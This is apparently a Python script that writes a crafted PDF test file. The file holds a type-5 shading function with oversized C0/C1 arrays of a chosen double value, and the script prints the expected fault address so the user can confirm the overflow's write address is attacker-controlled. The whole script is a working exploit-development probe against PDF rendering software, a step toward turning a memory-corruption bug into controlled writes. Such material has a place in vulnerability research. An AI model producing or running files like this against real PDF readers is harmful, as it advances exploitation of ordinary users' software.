#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""gen_cg_fingerprint.py <out_dir> [R] [value] - fixture with a chosen C0/C1 value.

Controllability check: if the overflow carries the double `value`, the fault address
must be exactly (bits(value) + 0xc) - that is, the write address is an exact function
of the chosen number.
"""
import os
import struct
import sys


def build(path: str, R: int, value: float) -> None:
    pts = [(0, 0), (65535, 0), (0, 65535), (65535, 65535)]
    v = bytearray()
    for i, (x, y) in enumerate(pts):
        v += x.to_bytes(2, "big") + y.to_bytes(2, "big")
        v.append([0x00, 0x40, 0x80, 0xC0][i])

    lit = repr(float(value))
    c0 = " ".join(lit for _ in range(R))
    c1 = " ".join(lit for _ in range(R))
    rng = " ".join("0 1" for _ in range(R))

    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
        b"/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>",
    ]
    cont = b"/Sh1 sh\n"
    objs.append(b"<< /Length %d >>\nstream\n" % len(cont) + cont + b"endstream")
    objs.append(
        b"<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate 16 "
        b"/BitsPerComponent 8 /VerticesPerRow 2 /Decode [0 200 0 200 0 1] "
        b"/Function 6 0 R /Length %d >>\nstream\n" % len(v) + bytes(v) + b"\nendstream"
    )
    objs.append(("<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%s] /C1 [%s] /Range [%s] >>"
                 % (c0, c1, rng)).encode())

    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offs = []
    for i, b in enumerate(objs, 1):
        offs.append(len(out))
        out += b"%d 0 obj\n" % i + b + b"\nendobj\n"
    x = len(out)
    out += b"xref\n0 %d\n" % (len(objs) + 1) + b"0000000000 65535 f \n"
    for o in offs:
        out += b"%010d 00000 n \n" % o
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objs) + 1, x)
    open(path, "wb").write(out)

    bits = struct.unpack(">Q", struct.pack(">d", float(value)))[0]
    print("%-16s R=%3d value=%-8r bits=%#018x expected_far=%#x  %d B"
          % (os.path.basename(path), R, value, bits, bits + 0xC, len(out)))


def main() -> None:
    out = sys.argv[1] if len(sys.argv) > 1 else "out/pdf"
    R = int(sys.argv[2]) if len(sys.argv) > 2 else 136
    V = float(sys.argv[3]) if len(sys.argv) > 3 else 1.0
    os.makedirs(out, exist_ok=True)
    build(os.path.join(out, "fp_val.pdf"), R, V)


if __name__ == "__main__":
    main()
